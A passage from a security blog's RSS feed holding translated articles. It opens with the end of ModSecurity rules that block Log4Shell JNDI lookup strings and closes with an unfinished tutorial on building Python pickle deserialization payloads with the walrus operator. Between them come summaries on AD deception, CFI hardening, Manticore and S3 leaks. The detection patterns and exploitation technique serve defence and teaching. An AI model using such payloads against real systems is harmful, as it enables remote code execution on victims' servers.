&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  ARGS|REQUEST_HEADERS|REQUEST_URI|REQUEST_BODY|REQUEST_COOKIES|REQUEST_LINE|QUERY_STRING &lt;span class=&#34;s2&#34;&gt;&amp;#34;jndi:ldap:|jndi:dns:|jndi:rmi:|jndi:rni:|\${jndi:&amp;#34;&lt;/span&gt; \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;err&#34;&gt;&amp;#34;&lt;/span&gt;phase:1, \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  id:751001, \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  t:none, \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  deny, \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  status:403, \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  log, \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  auditlog, \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  msg:&amp;#39;DVT: CVE-2021-44228 - phase &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; - deny known \&lt;span class=&#34;err&#34;&gt;&amp;#34;&lt;/span&gt;jndi:\&lt;span class=&#34;err&#34;&gt;&amp;#34;&lt;/span&gt; pattern&amp;#39;, \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  severity:&amp;#39;5&amp;#39;, \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  rev:1, \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  tag:&amp;#39;no_ar&amp;#39;&lt;span class=&#34;err&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;SecRule&lt;/span&gt; \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  ARGS|REQUEST_HEADERS|REQUEST_URI|REQUEST_BODY|REQUEST_COOKIES|REQUEST_LINE|QUERY_STRING &lt;span class=&#34;s2&#34;&gt;&amp;#34;jndi:ldap:|jndi:dns:|jndi:rmi:|jndi:rni:|\${jndi:&amp;#34;&lt;/span&gt; \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;err&#34;&gt;&amp;#34;&lt;/span&gt;phase:2, \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  id:751002, \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  t:none, \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  deny, \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  status:403, \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  log, \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  auditlog, \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  msg:&amp;#39;DVT: CVE-2021-44228 - phase &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; - deny known \&lt;span class=&#34;err&#34;&gt;&amp;#34;&lt;/span&gt;jndi:\&lt;span class=&#34;err&#34;&gt;&amp;#34;&lt;/span&gt; pattern&amp;#39;, \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  severity:&amp;#39;5&amp;#39;, \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  rev:1, \
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  tag:&amp;#39;no_ar&amp;#39;&lt;span class=&#34;err&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;评论精选&lt;/strong&gt;：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Ali提问：为什么需要phase 1规则？攻击者通过POST请求体发送攻击模式时是否会触发漏洞？&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;作者回复：phase 1规则是为了在Shibboleth插件(可能存在漏洞)之前运行。但确实需要更多规则来应对攻击者的变种。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;R建议：规则是否应该包含jndi:dns和jndi:rmi？&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;增强版已采纳该建议&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Jakob指出：此规则无法防御某些特殊变种攻击(附Twitter链接)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;作者说明：这些规则仅作为临时防护方案，企业应及时修补所有互联网 facing 系统&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
</description>
        </item>
        <item>
        <title>利用Active Directory进行攻击防御的技术解析</title>
        <link>http://localhost:1313/p/%E5%88%A9%E7%94%A8active-directory%E8%BF%9B%E8%A1%8C%E6%94%BB%E5%87%BB%E9%98%B2%E5%BE%A1%E7%9A%84%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/</link>
        <pubDate>Mon, 04 Aug 2025 03:36:17 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%88%A9%E7%94%A8active-directory%E8%BF%9B%E8%A1%8C%E6%94%BB%E5%87%BB%E9%98%B2%E5%BE%A1%E7%9A%84%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/</guid>
        <description>&lt;h1 id=&#34;webcast-weaponizing-active-directory&#34;&gt;Webcast: Weaponizing Active Directory
&lt;/h1&gt;&lt;p&gt;点击时间码跳转到视频的对应部分（在YouTube上）&lt;br&gt;
本次网络研讨会的幻灯片可以在这里找到：&lt;a class=&#34;link&#34; href=&#34;https://www.blackhillsinfosec.com/wp-content/uploads/2020/09/SLIDES_WeaponizingActiveDirectory.pdf&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;幻灯片链接&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;0:54&lt;/strong&gt; 本次网络研讨会的背景、内容和原因&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;7:02&lt;/strong&gt; 在Active Directory中创建资源：用户账户、组和虚拟计算机账户&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;18:54&lt;/strong&gt; 工具介绍：ResponderGuard、攻击的一般流程、侦察、欺骗和植入凭证&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;38:12&lt;/strong&gt; 密码喷洒、蜜罐用户、Kerberoasting攻击和组播DNS投毒&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;47:20&lt;/strong&gt; 使用CredDefense工具包进行检测：ResponderGuard、ResponderGuard代理和SQL Server滥用攻击&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;53:43&lt;/strong&gt; 问答环节和总结&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;本次网络研讨会最初于2019年8月1日由David Fletcher录制。&lt;br&gt;
2019年Verizon DBIR报告显示，超过50%的入侵事件需要一个月或更长时间才能被发现。&lt;br&gt;
本次研讨会涵盖了一些基本技术，旨在通过战术欺骗来捕捉攻击者在环境中尝试横向移动和权限提升的行为，从而缩短平均检测时间（MTTD）。&lt;/p&gt;
&lt;h3 id=&#34;准备好深入学习了吗&#34;&gt;准备好深入学习了吗？
&lt;/h3&gt;&lt;p&gt;通过Antisyphon的实惠课程提升你的技能！&lt;br&gt;
提供“按需付费”培训，支持现场/虚拟和按需学习。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;Black Hills Information Security, Inc.&lt;/strong&gt;&lt;br&gt;
890 Lazelle Street, Sturgis, SD 57785-1611 | 701-484-BHIS (2447)&lt;br&gt;
© 2008-2024&lt;br&gt;
[关于我们](About Us) | [BHIS Tribe of Companies](BHIS Tribe of Companies) | [隐私政策](Privacy Policy) | &lt;a class=&#34;link&#34; href=&#34;Contact&#34; &gt;联系我们&lt;/a&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>部署安全缓解措施面临的挑战：ClangCFI与CFGuard的实践对比</title>
        <link>http://localhost:1313/p/%E9%83%A8%E7%BD%B2%E5%AE%89%E5%85%A8%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD%E9%9D%A2%E4%B8%B4%E7%9A%84%E6%8C%91%E6%88%98clangcfi%E4%B8%8Ecfguard%E7%9A%84%E5%AE%9E%E8%B7%B5%E5%AF%B9%E6%AF%94/</link>
        <pubDate>Mon, 04 Aug 2025 03:19:48 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E9%83%A8%E7%BD%B2%E5%AE%89%E5%85%A8%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD%E9%9D%A2%E4%B8%B4%E7%9A%84%E6%8C%91%E6%88%98clangcfi%E4%B8%8Ecfguard%E7%9A%84%E5%AE%9E%E8%B7%B5%E5%AF%B9%E6%AF%94/</guid>
        <description>&lt;h3 id=&#34;计划实施&#34;&gt;计划实施
&lt;/h3&gt;&lt;p&gt;我们原计划简单明了：为Windows版osquery启用CFGuard，为Linux版启用ClangCFI。通过对比测试套件结果进行量化评估，最终将补丁贡献给osquery代码库，实现双赢——既产出技术博客又增强安全性。&lt;/p&gt;
&lt;h3 id=&#34;严格性对比&#34;&gt;严格性对比
&lt;/h3&gt;&lt;p&gt;ClangCFI在安全性上更为严格：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;对每个间接调用，ClangCFI允许的目标地址更少（图1示例）&lt;/li&gt;
&lt;li&gt;执行更全面的错误检测（如类型转换检查、虚方法调用目标验证等）&lt;/li&gt;
&lt;li&gt;要求全程序分析，因此必须满足：
&lt;ol&gt;
&lt;li&gt;所有链接对象和静态库都需启用CFI&lt;/li&gt;
&lt;li&gt;必须启用链接时优化(LTO)&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;CFGuard则采用更宽松的验证标准：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;仅需验证间接调用目标是否为合法函数入口点&lt;/li&gt;
&lt;li&gt;支持渐进式部署，允许混合使用受保护和未受保护的代码模块&lt;/li&gt;
&lt;li&gt;动态链接库(DSO/DLL)完全兼容&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;工程实践挑战&#34;&gt;工程实践挑战
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;ClangCFI的全有或全无特性&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;必须为整个依赖树启用CFI（包括libc++等深层依赖）&lt;/li&gt;
&lt;li&gt;链接器不会检查CFI一致性，但运行时可能失败（表1展示合法链接组合）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;代码兼容性问题&lt;/strong&gt;：
尝试为strongSwan启用ClangCFI时，其C语言OOP系统因类型签名不匹配触发严格检查。虽然技术上ClangCFI正确，但实际代码中存在大量不符合标准的模式。CFI黑名单功能在此场景下几乎需禁用所有检查点，失去安全意义。&lt;/p&gt;
&lt;h3 id=&#34;结论&#34;&gt;结论
&lt;/h3&gt;&lt;p&gt;从安全角度看，ClangCFI确实优于CFGuard——更严格的检查、全程序保护、更多运行时验证。Google Chrome团队已成功实践该方案。但增强安全的代价是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;需要大量开发时间投入&lt;/li&gt;
&lt;li&gt;必须进行严格测试&lt;/li&gt;
&lt;li&gt;对现有代码库改造难度大&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;而CFGuard的灵活性使其能快速应用于现有项目。最终我们的Windows版osquery已实装CFGuard，Linux版ClangCFI仍在攻坚中。这种对比深刻揭示了安全措施在理想与现实之间的关键权衡。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;[1] 技术细节补充：CFGuard实际也存在例外情况，如某些被抑制的函数入口点仍属非法目标&lt;br&gt;
[2] 根据Evgeniy Stepanov的解释，非CFI代码中的函数若仅被直接调用仍可混合链接&lt;br&gt;
[3] 官方文档明确允许混合CFG/非CFG代码共存&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Manticore 0.3.0发布：符号执行引擎的重大升级</title>
        <link>http://localhost:1313/p/manticore-0.3.0%E5%8F%91%E5%B8%83%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E5%BC%95%E6%93%8E%E7%9A%84%E9%87%8D%E5%A4%A7%E5%8D%87%E7%BA%A7/</link>
        <pubDate>Mon, 04 Aug 2025 03:03:11 +0800</pubDate>
        
        <guid>http://localhost:1313/p/manticore-0.3.0%E5%8F%91%E5%B8%83%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E5%BC%95%E6%93%8E%E7%9A%84%E9%87%8D%E5%A4%A7%E5%8D%87%E7%BA%A7/</guid>
        <description>&lt;h1 id=&#34;执行器重构&#34;&gt;执行器重构
&lt;/h1&gt;&lt;p&gt;Felipe Manzano完成了Manticore状态机的重大重构，现在采用多进程模块（multiprocessing），为未来实现分布式符号执行奠定了基础。该重构引入了少量API变更：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;必须显式调用&lt;code&gt;finalize&lt;/code&gt;方法才能导出测试用例&lt;/li&gt;
&lt;li&gt;&lt;code&gt;will_start_run&lt;/code&gt;回调更名为&lt;code&gt;will_run&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;需通过&lt;code&gt;Z3Solver.instance()&lt;/code&gt;显式访问求解器单例&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;unicorn预加载&#34;&gt;Unicorn预加载
&lt;/h1&gt;&lt;p&gt;为解决Python原生指令模拟速度瓶颈，新增Unicorn模拟器插件。该插件基于QEMU的JIT引擎，可将不重要初始化代码的执行速度提升高达50倍。&lt;/p&gt;
&lt;h1 id=&#34;aarch64支持&#34;&gt;AArch64支持
&lt;/h1&gt;&lt;p&gt;Nikita Karetnikov为静态编译的AArch64 Linux二进制文件添加了支持。虽然当前实现包含调试组件导致性能略低，但该架构可覆盖从嵌入式开发板到服务器集群的广泛ARMv8平台。&lt;/p&gt;
&lt;h1 id=&#34;系统调用审计&#34;&gt;系统调用审计
&lt;/h1&gt;&lt;p&gt;本次更新包含：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;新增12个系统调用实现&lt;/li&gt;
&lt;li&gt;为未实现调用添加&amp;quot;存根&amp;quot;机制，避免直接抛出异常&lt;/li&gt;
&lt;li&gt;遇到未实现调用时会显示&amp;quot;Unimplemented system call&amp;quot;警告&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;符号化evm测试&#34;&gt;符号化EVM测试
&lt;/h1&gt;&lt;p&gt;通过持续集成管道自动运行以太坊Frontier版本VM测试，确保每个指令的符号化实现正确性，维护智能合约分析的可靠性。&lt;/p&gt;
&lt;h1 id=&#34;代码格式化&#34;&gt;代码格式化
&lt;/h1&gt;&lt;p&gt;项目现已采用black自动格式化工具，要求开发者提交代码前执行&lt;code&gt;black -t py36 -l 100 .&lt;/code&gt;以保证代码风格统一。&lt;/p&gt;
&lt;h1 id=&#34;后续计划&#34;&gt;后续计划
&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;改进文档和示例仓库&lt;/li&gt;
&lt;li&gt;开展可用性研究&lt;/li&gt;
&lt;li&gt;集成crytic-compile以简化智能合约分析&lt;/li&gt;
&lt;li&gt;支持EVM Constantinople升级&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/trailofbits/manticore&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;GitHub下载&lt;/a&gt; | &lt;a class=&#34;link&#34; href=&#34;https://pypi.org/project/manticore/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;PyPI安装&lt;/a&gt; | &lt;a class=&#34;link&#34; href=&#34;https://hub.docker.com/r/trailofbits/manticore&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Docker镜像&lt;/a&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>亚马逊S3存储桶数据泄露风险解析：企业云安全配置漏洞的警示</title>
        <link>http://localhost:1313/p/%E4%BA%9A%E9%A9%AC%E9%80%8As3%E5%AD%98%E5%82%A8%E6%A1%B6%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2%E9%A3%8E%E9%99%A9%E8%A7%A3%E6%9E%90%E4%BC%81%E4%B8%9A%E4%BA%91%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E7%9A%84%E8%AD%A6%E7%A4%BA/</link>
        <pubDate>Mon, 04 Aug 2025 02:41:35 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E4%BA%9A%E9%A9%AC%E9%80%8As3%E5%AD%98%E5%82%A8%E6%A1%B6%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2%E9%A3%8E%E9%99%A9%E8%A7%A3%E6%9E%90%E4%BC%81%E4%B8%9A%E4%BA%91%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E7%9A%84%E8%AD%A6%E7%A4%BA/</guid>
        <description>&lt;h3 id=&#34;风险重现亚马逊s3存储桶为何频现数据泄露&#34;&gt;风险重现：亚马逊S3存储桶为何频现数据泄露？
&lt;/h3&gt;&lt;p&gt;在本期《Risk &amp;amp; Repeat》播客中，SearchSecurity编辑团队探讨了近期通过错误配置的亚马逊S3存储桶导致的企业数据泄露事件及其应对方案。&lt;/p&gt;
&lt;h4 id=&#34;企业数据持续暴露&#34;&gt;企业数据持续暴露
&lt;/h4&gt;&lt;p&gt;近期又有多家企业数据通过亚马逊简单存储服务（S3）意外暴露。最典型案例涉及道琼斯公司，网络安全公司UpGuard发现其公开的S3存储桶包含数百万客户信息，涵盖姓名、地址、电子邮件及部分信用卡号。研究人员指出该存储桶权限设置允许任何AWS账户持有者通过资源URL下载数据，道琼斯公司将事件归因于&amp;quot;内部错误&amp;quot;。&lt;/p&gt;
&lt;p&gt;此前UpGuard还发现威瑞森（Verizon）和博思艾伦咨询公司（Booz Allen Hamilton）等企业同样存在S3存储桶配置错误问题。由于访问控制和权限设置缺失，这些数据仓库在网络上处于公开可访问状态。&lt;/p&gt;
&lt;h4 id=&#34;核心问题探讨&#34;&gt;核心问题探讨
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;配置错误如何发生？&lt;/li&gt;
&lt;li&gt;亚马逊是否应加强客户防错措施？&lt;/li&gt;
&lt;li&gt;企业安全策略为何无法阻止云数据暴露？&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;本期播客中，编辑Rob Wright与Peter Loshin深入分析了S3存储桶数据泄露的机制、后果及解决方案，同时更新了关于赛门铁克证书颁发机构业务争议的最新进展。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>利用海象运算符简化Python反序列化漏洞利用</title>
        <link>http://localhost:1313/p/%E5%88%A9%E7%94%A8%E6%B5%B7%E8%B1%A1%E8%BF%90%E7%AE%97%E7%AC%A6%E7%AE%80%E5%8C%96python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</link>
        <pubDate>Mon, 04 Aug 2025 02:19:58 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%88%A9%E7%94%A8%E6%B5%B7%E8%B1%A1%E8%BF%90%E7%AE%97%E7%AC%A6%E7%AE%80%E5%8C%96python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</guid>
        <description>&lt;h1 id=&#34;利用海象运算符简化反序列化载荷构造&#34;&gt;利用海象运算符简化反序列化载荷构造
&lt;/h1&gt;&lt;p&gt;在利用Python反序列化（特别是Pickle）漏洞时，通常需要构造包含参数集合和服务器端可用可调用对象的载荷。最常见的方法是使用&lt;code&gt;eval&lt;/code&gt;函数配合待执行的字符串，这种方案非常灵活——通常可以导入&lt;code&gt;os&lt;/code&gt;模块并调用&lt;code&gt;os.system&lt;/code&gt;执行任意命令。但某些场景下会存在限制，例如无法直接获取应用输出或出站连接被阻断导致反向Shell失效。有时甚至需要反序列化操作返回具有特定属性的对象。&lt;/p&gt;
&lt;p&gt;传统方案若目标环境中存在现成类且攻击者了解其结构，可直接构造对应对象。否则将变得棘手，因为&lt;code&gt;eval&lt;/code&gt;仅支持单表达式求值，而类声明属于语句而非表达式。Python 3.8引入的海象运算符（&lt;code&gt;:=&lt;/code&gt;）完美解决了这个问题，它允许我们将赋值操作作为表达式的一部分。&lt;/p&gt;
&lt;p&gt;核心思路是通过构造元组，使每个元素都能访问前序元素赋值的变量。例如以下合法Python表达式将求值为2：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;我们可以利用相同模式构造任意对象。假设存在如下服务端代码：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;ch&#34;&gt;#!/usr/bin/env python3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;base64&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pickle&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Item&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;object&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;fm&#34;&gt;__init__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;bp&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;bp&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;process&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;bp&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;bp&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;upper&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
